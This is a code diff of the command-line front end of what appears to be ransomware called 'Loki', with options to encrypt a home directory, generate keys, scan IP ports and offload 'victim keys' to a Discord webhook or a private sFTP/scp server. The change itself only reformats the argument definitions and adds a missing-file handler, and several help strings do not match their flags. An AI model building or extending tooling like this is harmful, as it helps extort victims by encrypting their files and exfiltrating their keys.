@@ -38,19 +38,19 @@ print_command = (f"\n[{Fore.YELLOW}>_{Fore.WHITE}]: ") # Always asks for a comma
 # Arg parser.
 parser = argparse.ArgumentParser()
 ap = parser.add_mutually_exclusive_group()
-ap.add_argument('-discovery', help='Call on Loki to encrypt the home directory and pull the encryption key.\n', action="store_true")
-ap.add_argument('-encrypt', help='Detect read/writes on prime target infrastructure files.', action="store_true")
-ap.add_argument('-decrypt', help='Scan a given IP ports for potential vulns.', action="store_true")
-ap.add_argument('-keygen', help='Keep this key secure, if you lose it, you cannot unencrypt files!', action="store_true")
-ap.add_argument('-hook', help='Offload victim keys to a discord webhook or private sFTP/scp connection.', action="store_true")
+ap.add_argument('-discovery',   help='Call on Loki to encrypt the home directory and pull the encryption key.\n',   action="store_true")
+ap.add_argument('-encrypt',     help='Detect read/writes on prime target infrastructure files.',                    action="store_true")
+ap.add_argument('-decrypt',     help='Scan a given IP ports for potential vulns.',                                  action="store_true")
+ap.add_argument('-keygen',      help='Keep this key secure, if you lose it, you cannot unencrypt files!',           action="store_true")
+ap.add_argument('-hook',        help='Offload victim keys to a discord webhook or private sFTP/scp connection.',    action="store_true")
 args = vars(parser.parse_args())
 
 # Args.
 if args['discovery']: # Runs the discovery program.
     while True:
         try:
-                discovery.discovery() # --
-                os._exit(0) # Attempts to exit.
+            discovery.discovery() # --
+            os._exit(0) # Attempts to exit.
         except:
             print(f"{print_prompt} {print_failed}: Discovery failed to run here!\n")
             print(f"[!] Manual cleanup may be necessary now to avoid exposure.")
@@ -107,3 +107,5 @@ if __name__ == '__main__':
             sys.exit(0) # Attempts to exit.
         except SystemExit:
             os._exit(0) # Attempts to exit.
+    except FileNotFoundError as not_found:
+        print("This file is missing:" + not_found.filename)
